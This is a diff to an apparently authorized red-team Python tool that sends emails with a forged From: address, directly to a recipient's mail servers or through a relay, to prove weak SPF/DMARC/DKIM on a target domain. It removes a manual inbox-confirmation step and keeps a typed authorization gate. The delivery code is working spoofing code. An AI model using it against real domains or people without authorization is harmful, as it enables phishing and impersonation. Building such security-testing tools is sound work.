@@ -14,7 +14,6 @@ import email.message
 import email.utils
 import json
 import os
-import re
 import smtplib
 import sys
 
@@ -53,63 +52,6 @@ def compute_verdict(records, forged_from):
     }
 
 
-def parse_auth_results(header):
-    """Extrai os veredictos de um header Authentication-Results.
-
-    Tolerante a múltiplas linhas e à ausência de campos. Retorna dict com
-    dmarc/spf/dkim/compauth → valor minúsculo ('pass'|'fail'|'none'|...) ou None.
-    """
-    keys = ("dmarc", "spf", "dkim", "compauth")
-    out = {k: None for k in keys}
-    if not header:
-        return out
-    flat = " ".join(str(header).splitlines())
-    for key in keys:
-        m = re.search(r'\b' + key + r'=([a-zA-Z]+)', flat, re.IGNORECASE)
-        if m:
-            out[key] = m.group(1).lower()
-    return out
-
-
-def compute_empirical_verdict(analytic, smtp_stage, landed=None, auth=None):
-    """Combina o verdito analítico (DNS) com a confirmação empírica.
-
-    smtp_stage: 'TRANSPORT_FAILED' | 'BLOCKED_BY_RELAY' | 'QUEUED'
-    landed:     'inbox' | 'spam' | 'not_delivered' | None (sem confirmação)
-    auth:       dict de parse_auth_results (ou None)
-    """
-    auth = auth or {}
-    dmarc = (auth.get("dmarc") or "").lower()
-    if smtp_stage == "TRANSPORT_FAILED":
-        return {"status": "INCONCLUSIVE_TRANSPORT", "severity": "info",
-                "impact_en": "Delivery transport failed (port 25 blocked or sending-IP "
-                             "reputation) — NOT a proof the domain is protected."}
-    if smtp_stage == "BLOCKED_BY_RELAY":
-        return {"status": "BLOCKED_BY_RELAY", "severity": "info",
-                "impact_en": "The sending path refused the forged envelope (MAIL/RCPT/DATA) "
-                             "before delivery."}
-    # smtp_stage == QUEUED
-    if landed is None:
-        return {"status": "QUEUED_PENDING_CONFIRMATION", "severity": "pending",
-                "impact_en": "Message queued for delivery; awaiting manual inbox confirmation "
-                             "(Authentication-Results)."}
-    if landed == "not_delivered":
-        return {"status": "NOT_DELIVERED", "severity": "info",
-                "impact_en": "Message was queued but never reached the mailbox "
-                             "(silently dropped/discarded)."}
-    if dmarc == "pass":
-        return {"status": "NOT_SPOOFABLE", "severity": "info",
-                "impact_en": "Receiver authenticated the message (dmarc=pass) — the forged "
-                             "From: did not bypass DMARC."}
-    if landed == "spam":
-        return {"status": "SPOOF_PROVEN_SPAM", "severity": "medium",
-                "impact_en": f"Forged From: delivered but quarantined/spam-foldered "
-                             f"(dmarc={dmarc or 'n/a'})."}
-    return {"status": "SPOOF_PROVEN_INBOX", "severity": "critical",
-            "impact_en": f"Forged From: of the exact domain delivered to the inbox with "
-                         f"dmarc={dmarc or 'n/a'} — spoofing proven."}
-
-
 def build_message(forged_from, to_addr, subject, body):
     """Monta o email forjado. Retorna (EmailMessage, message_id capturado)."""
     msg = email.message.EmailMessage()
@@ -138,6 +80,16 @@ def _decode(resp):
     return resp.decode(errors="replace") if isinstance(resp, (bytes, bytearray)) else str(resp)
 
 
+def _require_ok(code, resp, label, ok=(250,)):
+    """smtplib.mail()/rcpt() não lançam em 4xx/5xx — exige código 2xx ou aborta.
+
+    Garante que 'accepted' reflita a aceitação real de cada estágio SMTP, e não
+    apenas o código final do DATA (que pode mascarar uma rejeição em MAIL/RCPT).
+    """
+    if code not in ok:
+        raise smtplib.SMTPException(f"{label} rejeitado: {code} {_decode(resp)}")
+
+
 def _quiet_close(s):
     if s is not None:
         try:
@@ -148,10 +100,9 @@ def _quiet_close(s):
 
 def deliver_direct(mx_hosts, helo, mail_from, rcpt_to, msg_bytes,
                    timeout=15, smtp_factory=smtplib.SMTP):
-    """Entrega direta na porta 25, tentando cada MX. Classifica o estágio."""
+    """Entrega direta na porta 25, tentando cada MX. Captura o transcript."""
     transcript = []
     last_err = None
-    stage = "TRANSPORT_FAILED"  # default: nem conectou
     for host in mx_hosts:
         s = None
         try:
@@ -162,18 +113,13 @@ def deliver_direct(mx_hosts, helo, mail_from, rcpt_to, msg_bytes,
             transcript.append(f"EHLO {helo} -> {code} {_decode(resp)}")
             code, resp = s.mail(mail_from)
             transcript.append(f"MAIL FROM:<{mail_from}> -> {code} {_decode(resp)}")
-            if code != 250:
-                stage = "BLOCKED_BY_RELAY"
-                raise smtplib.SMTPException(f"MAIL FROM rejeitado: {code} {_decode(resp)}")
+            _require_ok(code, resp, "MAIL FROM")
             code, resp = s.rcpt(rcpt_to)
             transcript.append(f"RCPT TO:<{rcpt_to}> -> {code} {_decode(resp)}")
-            if code not in (250, 251):
-                stage = "BLOCKED_BY_RELAY"
-                raise smtplib.SMTPException(f"RCPT TO rejeitado: {code} {_decode(resp)}")
+            _require_ok(code, resp, "RCPT TO", ok=(250, 251))
             code, resp = s.data(msg_bytes)
             transcript.append(f"DATA -> {code} {_decode(resp)}")
-            stage = "QUEUED" if code == 250 else "BLOCKED_BY_RELAY"
-            accepted = stage == "QUEUED"
+            accepted = code == 250
             # A mensagem já foi entregue: uma falha no QUIT não deve disparar
             # retry a outro MX (evita reenvio duplicado do email forjado).
             try:
@@ -181,15 +127,14 @@ def deliver_direct(mx_hosts, helo, mail_from, rcpt_to, msg_bytes,
             except Exception:
                 _quiet_close(s)
             return {"method": "direct", "mx_used": host, "accepted": accepted,
-                    "smtp_stage": stage, "transcript": transcript}
+                    "transcript": transcript}
         except Exception as e:
             transcript.append(f"ERROR {host}: {e}")
             last_err = e
             _quiet_close(s)
             continue
     return {"method": "direct", "mx_used": None, "accepted": False,
-            "smtp_stage": stage, "transcript": transcript,
-            "error": str(last_err) if last_err else None}
+            "transcript": transcript, "error": str(last_err) if last_err else None}
 
 
 def deliver_relay(host, port, user, password, helo, mail_from, rcpt_to, msg_bytes,
@@ -197,7 +142,6 @@ def deliver_relay(host, port, user, password, helo, mail_from, rcpt_to, msg_byte
     """Entrega via relay configurado (STARTTLS+login se user fornecido)."""
     transcript = []
     s = None
-    stage = "TRANSPORT_FAILED"
     try:
         transcript.append(f"CONNECTING relay {host}:{port}")
         s = smtp_factory(host, port, timeout=timeout)
@@ -212,29 +156,24 @@ def deliver_relay(host, port, user, password, helo, mail_from, rcpt_to, msg_byte
             transcript.append("STARTTLS + AUTH")
         code, resp = s.mail(mail_from)
         transcript.append(f"MAIL FROM:<{mail_from}> -> {code} {_decode(resp)}")
-        if code != 250:
-            stage = "BLOCKED_BY_RELAY"
-            raise smtplib.SMTPException(f"MAIL FROM rejeitado: {code} {_decode(resp)}")
+        _require_ok(code, resp, "MAIL FROM")
         code, resp = s.rcpt(rcpt_to)
         transcript.append(f"RCPT TO:<{rcpt_to}> -> {code} {_decode(resp)}")
-        if code not in (250, 251):
-            stage = "BLOCKED_BY_RELAY"
-            raise smtplib.SMTPException(f"RCPT TO rejeitado: {code} {_decode(resp)}")
+        _require_ok(code, resp, "RCPT TO", ok=(250, 251))
         code, resp = s.data(msg_bytes)
         transcript.append(f"DATA -> {code} {_decode(resp)}")
-        stage = "QUEUED" if code == 250 else "BLOCKED_BY_RELAY"
-        accepted = stage == "QUEUED"
+        accepted = code == 250
         try:
             s.quit()
         except Exception:
             _quiet_close(s)
         return {"method": "relay", "mx_used": host, "accepted": accepted,
-                "smtp_stage": stage, "transcript": transcript}
+                "transcript": transcript}
     except Exception as e:
         transcript.append(f"ERROR relay {host}: {e}")
         _quiet_close(s)
         return {"method": "relay", "mx_used": host, "accepted": False,
-                "smtp_stage": stage, "transcript": transcript, "error": str(e)}
+                "transcript": transcript, "error": str(e)}
 
 
 def roe_gate(forged_from, to_addr, method, assume_yes=False, interactive=None):
@@ -257,7 +196,7 @@ def roe_gate(forged_from, to_addr, method, assume_yes=False, interactive=None):
     return ans.strip() == "EU AUTORIZO"
 
 
-def write_evidence(outdir, domain, records, verdict, send, empirical=None, manual=None):
+def write_evidence(outdir, domain, records, verdict, send):
     """Grava spoof_evidence.json e (se houve envio) smtp_transcript.txt."""
     os.makedirs(outdir, exist_ok=True)
     evidence = {
@@ -266,10 +205,6 @@ def write_evidence(outdir, domain, records, verdict, send, empirical=None, manua
         "dns_records": records,
         "verdict": verdict,
     }
-    if empirical is not None:
-        evidence["empirical_verdict"] = empirical
-    if manual is not None:
-        evidence["manual_confirmation"] = manual
     if send is not None:
         transcript = send.get("transcript", [])
         evidence["send"] = {k: v for k, v in send.items() if k != "transcript"}
@@ -281,26 +216,6 @@ def write_evidence(outdir, domain, records, verdict, send, empirical=None, manua
     return evidence
 
 
-def finalize_evidence(outdir, auth_results, landed):
-    """Aplica a confirmação manual a uma evidência pendente e grava o verdito empírico final."""
-    path = os.path.join(outdir, "spoof_evidence.json")
-    with open(path) as f:
-        evidence = json.load(f)
-    auth = parse_auth_results(auth_results)
-    analytic = evidence.get("verdict", {})
-    stage = (evidence.get("send") or {}).get("smtp_stage", "QUEUED")
-    empirical = compute_empirical_verdict(analytic, stage, landed=landed, auth=auth)
-    evidence["empirical_verdict"] = empirical
-    mc = evidence.get("manual_confirmation") or {}
-    mc["landed"] = landed
-    mc["authentication_results"] = auth_results
-    mc["parsed_auth"] = auth
-    evidence["manual_confirmation"] = mc
-    with open(path, "w") as f:
-        json.dump(evidence, f, ensure_ascii=False, indent=2)
-    return empirical
-
-
 def _default_outdir(domain):
     ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
     return f"spoof_poc_{domain}_{ts}"
@@ -308,7 +223,7 @@ def _default_outdir(domain):
 
 def parse_args(argv=None):
     p = argparse.ArgumentParser(description="Evidência de exploração de SPF/DMARC/DKIM (red team autorizado).")
-    p.add_argument("domain", nargs="?", help="Domínio alvo (domínio forjado em From:/MAIL FROM)")
+    p.add_argument("domain", help="Domínio alvo (domínio forjado em From:/MAIL FROM)")
     p.add_argument("--dry-run", action="store_true", help="Mostra o envelope/headers sem enviar")
     p.add_argument("--send", action="store_true", help="Ativa entrega forjada (opt-in, exige RoE)")
     p.add_argument("--to", help="Destinatário (obrigatório com --send)")
@@ -316,9 +231,7 @@ def parse_args(argv=None):
     p.add_argument("--subject", default="[AUTHORIZED SECURITY TEST] Email spoofing PoC")
     p.add_argument("--body", default="This is an authorized email spoofing proof-of-concept. No action required.")
     p.add_argument("--body-file", help="Lê o corpo de um arquivo")
-    p.add_argument("--smtp", help="Relay HOST[:PORT] — caminho primário de envio quando fornecido")
-    p.add_argument("--allow-direct", action="store_true",
-                   help="Permite fallback de entrega direta na porta 25 quando o relay não enfileira.")
+    p.add_argument("--smtp", help="Relay de fallback HOST[:PORT]")
     p.add_argument("--smtp-user")
     p.add_argument("--smtp-pass",
                    help="Senha do relay. Prefira a env STIGLITZ_SMTP_PASS (evita exposição em ps/history).")
@@ -326,12 +239,6 @@ def parse_args(argv=None):
     p.add_argument("--roe-accept", action="store_true",
                    help="AUTORIZA o envio sem prompt (RoE prévio; p/ CI com autorização). Equivale a digitar EU AUTORIZO.")
     p.add_argument("--outdir", default=None)
-    p.add_argument("--finalize", metavar="DIR",
-                   help="Modo finalização: aplica a confirmação manual a uma evidência pendente.")
-    p.add_argument("--auth-results", help="Header Authentication-Results colado da caixa (com --finalize).")
-    p.add_argument("--auth-results-file", help="Lê o Authentication-Results de um arquivo (com --finalize).")
-    p.add_argument("--landed", choices=("inbox", "spam", "not_delivered"),
-                   help="Onde a mensagem chegou (com --finalize).")
     return p.parse_args(argv)
 
 
@@ -340,27 +247,6 @@ def main(argv=None):
     from email_security import analyze, dig
 
     args = parse_args(argv)
-
-    if args.finalize:
-        auth_results = args.auth_results
-        if args.auth_results_file:
-            try:
-                with open(args.auth_results_file) as f:
-                    auth_results = f.read()
-            except OSError as e:
-                print(f"  [!] Não foi possível ler --auth-results-file: {e}")
-                return 2
-        if not auth_results or not args.landed:
-            print("  [!] --finalize requer --auth-results/--auth-results-file e --landed.")
-            return 2
-        empirical = finalize_evidence(args.finalize, auth_results, args.landed)
-        print(f"  [VERDITO EMPÍRICO] {empirical['status']} — {empirical['impact_en']}")
-        return 0
-
-    if not args.domain:
-        print("  [!] Informe o domínio alvo (ou use --finalize DIR).")
-        return 2
-
     domain = args.domain
     forged_from = args.from_addr or f"security-test@{domain}"
     outdir = args.outdir or _default_outdir(domain)
@@ -404,30 +290,24 @@ def main(argv=None):
             print(f"\n  [✓] Evidência analítica em {outdir}/spoof_evidence.json")
             return 0
 
-        method_desc = ("relay " + args.smtp) if args.smtp else "direct-MX"
+        method_desc = "direct-MX" + (" (fallback relay)" if args.smtp else "")
         if not roe_gate(forged_from, args.to, method_desc, assume_yes=args.roe_accept):
             return 1
 
+        recipient_domain = args.to.split("@", 1)[1]
+        mx_hosts = parse_mx(dig("MX", recipient_domain))
         msg_bytes = msg.as_bytes()
-        if args.smtp:
-            print("  [!] Relay autenticado: a prova de spoof só vale se o relay PRESERVAR o "
-                  "From: forjado. Relays gerenciados (Gmail/SES/etc) reescrevem/rejeitam.")
+
+        result = {"accepted": False, "transcript": ["sem MX resolvido"]}
+        if mx_hosts:
+            result = deliver_direct(mx_hosts, helo, forged_from, args.to, msg_bytes)
+        if not result["accepted"] and args.smtp:
+            print("  [→] Entrega direta falhou — tentando relay configurado ...")
             host, _, port = args.smtp.partition(":")
             smtp_pass = args.smtp_pass or os.environ.get("STIGLITZ_SMTP_PASS")
             result = deliver_relay(host, int(port) if port else 587,
                                    args.smtp_user, smtp_pass, helo,
                                    forged_from, args.to, msg_bytes)
-            if result.get("smtp_stage") != "QUEUED" and args.allow_direct:
-                print("  [→] Relay não enfileirou — fallback de entrega direta (--allow-direct) ...")
-                mx_hosts = parse_mx(dig("MX", args.to.split("@", 1)[1]))
-                if mx_hosts:
-                    result = deliver_direct(mx_hosts, helo, forged_from, args.to, msg_bytes)
-        else:
-            mx_hosts = parse_mx(dig("MX", args.to.split("@", 1)[1]))
-            result = {"method": "direct", "mx_used": None, "accepted": False,
-                      "smtp_stage": "TRANSPORT_FAILED", "transcript": ["sem MX resolvido"]}
-            if mx_hosts:
-                result = deliver_direct(mx_hosts, helo, forged_from, args.to, msg_bytes)
 
         send = {
             "recipient": args.to,
@@ -435,38 +315,11 @@ def main(argv=None):
             "mx_used": result.get("mx_used"),
             "delivery_method": result.get("method", "direct"),
             "message_id": msg_id,
-            "smtp_stage": result.get("smtp_stage"),
-            "accepted": result.get("accepted", False),
+            "accepted": result["accepted"],
             "transcript": result["transcript"],
         }
-        stage = result.get("smtp_stage", "TRANSPORT_FAILED")
-        print(f"  [SMTP] stage={stage} via {send['delivery_method']} (mx={send['mx_used']})")
-
-        empirical = compute_empirical_verdict(verdict, stage, landed=None, auth=None)
-        manual = None
-        if stage == "QUEUED":
-            manual = {
-                "message_id": msg_id,
-                "forged_from": forged_from,
-                "recipient": args.to,
-                "landed": None,
-                "authentication_results": None,
-                "instructions_en": (
-                    f"Open mailbox {args.to}, find the message with Message-ID {msg_id}, "
-                    f"copy its Authentication-Results header, then run: "
-                    f"python3 email_spoof_poc.py --finalize {outdir} "
-                    f"--auth-results \"<header>\" --landed inbox|spam|not_delivered"),
-            }
-            print("\n  [CONFIRMAÇÃO MANUAL] Email enfileirado. Para fechar a prova:")
-            print(f"      1) Abra a caixa {args.to} e localize Message-ID {msg_id}")
-            print("      2) Copie o header Authentication-Results")
-            print(f"      3) python3 email_spoof_poc.py --finalize {outdir} "
-                  "--auth-results \"<header>\" --landed inbox|spam")
-        print(f"  [VERDITO EMPÍRICO] {empirical['status']} — {empirical['impact_en']}")
-
-        write_evidence(outdir, domain, records, verdict, send, empirical=empirical, manual=manual)
-        print(f"  [✓] Evidência em {outdir}/spoof_evidence.json")
-        return 0
+        status = "ACEITO (250)" if result["accepted"] else "REJEITADO/FALHOU"
+        print(f"  [SMTP] {status} via {send['delivery_method']} (mx={send['mx_used']})")
 
     write_evidence(outdir, domain, records, verdict, send)
     print(f"  [✓] Evidência em {outdir}/spoof_evidence.json")
